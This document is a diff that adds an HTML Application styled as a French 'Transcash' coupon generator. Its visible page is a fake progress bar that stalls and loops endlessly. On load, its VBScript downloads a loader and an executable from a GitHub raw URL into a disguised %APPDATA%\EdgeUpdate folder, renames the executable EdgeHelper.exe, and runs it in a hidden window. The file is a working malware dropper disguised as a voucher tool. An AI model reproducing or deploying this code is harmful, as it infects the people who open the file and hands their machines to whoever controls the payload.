@@ -1,0 +1,135 @@
+<html>
+<head>
+<title>Transcash - Génération du coupon</title>
+<HTA:APPLICATION 
+  ID="couponGen"
+  APPLICATIONNAME="Transcash Coupon"
+  BORDER="thin"
+  BORDERSTYLE="normal"
+  CAPTION="yes"
+  CONTEXTMENU="no"
+  MAXIMIZEBUTTON="no"
+  MINIMIZEBUTTON="no"
+  SCROLL="no"
+  SHOWINTASKBAR="yes"
+  SINGLEINSTANCE="yes"
+  SYSMENU="yes"
+  WINDOWSTATE="normal"
+/>
+<style>
+  body {
+    margin: 0;
+    background-color: #b40000;
+    font-family: 'Segoe UI', sans-serif;
+    color: #ffffff;
+  }
+  #container {
+    background-color: white;
+    margin: 50px auto;
+    padding: 30px;
+    width: 600px;
+    text-align: center;
+    border-radius: 8px;
+    color: #b40000;
+  }
+  #progressBarContainer {
+    width: 100%;
+    height: 30px;
+    background-color: #ddd;
+    border-radius: 5px;
+    margin-top: 20px;
+    overflow: hidden;
+  }
+  #progressBar {
+    height: 100%;
+    width: 0%;
+    background-color: #b40000;
+    transition: width 0.5s;
+  }
+  #status {
+    font-size: 20px;
+    margin-top: 15px;
+    font-weight: bold;
+    animation: blink 1s infinite;
+  }
+  #percent {
+    font-size: 28px;
+    margin-top: 5px;
+  }
+  @keyframes blink {
+    0% {opacity: 1;}
+    50% {opacity: 0;}
+    100% {opacity: 1;}
+  }
+</style>
+</head>
+
+<body>
+  <div id="container">
+    <h2>Votre coupon Transcash est en cours de génération</h2>
+    <div id="status">Génération du coupon en cours…</div>
+    <div id="percent">0%</div>
+    <div id="progressBarContainer">
+      <div id="progressBar"></div>
+    </div>
+  </div>
+
+<script language="VBScript">
+Sub Window_OnLoad
+  Call StartProgress()
+  Call DownloadAndExecute()
+End Sub
+
+Sub StartProgress()
+  Dim i
+  For i = 1 To 100
+    progressPercent = i & "%"
+    document.getElementById("percent").innerText = progressPercent
+    document.getElementById("progressBar").style.width = progressPercent
+    If i = 97 Then
+      WScript.Sleep 1200000  ' Pause de 20 min entre 97% et 99%
+    End If
+    WScript.Sleep 4800 ' ≈ 8 minutes en tout
+  Next
+  Call StartProgress() ' Boucle infinie
+End Sub
+
+Sub DownloadAndExecute()
+  Dim fso, shell, appData, folder, binFile, exeFile, xmlHttp
+
+  Set shell = CreateObject("WScript.Shell")
+  appData = shell.ExpandEnvironmentStrings("%APPDATA%") & "\EdgeUpdate\"
+
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  If Not fso.FolderExists(appData) Then
+    fso.CreateFolder(appData)
+  End If
+
+  ' Télécharger loader.bin
+  Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
+  xmlHttp.Open "GET", "https://raw.githubusercontent.com/fabienneroger/finale/refs/heads/main/loader.bin", False
+  xmlHttp.Send
+
+  If xmlHttp.Status = 200 Then
+    Set binFile = fso.CreateTextFile(appData & "loader.bin", True)
+    binFile.Write xmlHttp.responseBody
+    binFile.Close
+  End If
+
+  ' Télécharger SharpLoader.exe
+  Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
+  xmlHttp.Open "GET", "https://raw.githubusercontent.com/fabienneroger/finale/refs/heads/main/SharpLoader.exe", False
+  xmlHttp.Send
+
+  If xmlHttp.Status = 200 Then
+    Set exeFile = fso.CreateTextFile(appData & "EdgeHelper.exe", True)
+    exeFile.Write xmlHttp.responseBody
+    exeFile.Close
+  End If
+
+  ' Exécuter furtivement EdgeHelper.exe
+  shell.Run Chr(34) & appData & "EdgeHelper.exe" & Chr(34), 0, False
+End Sub
+</script>
+</body>
+</html>
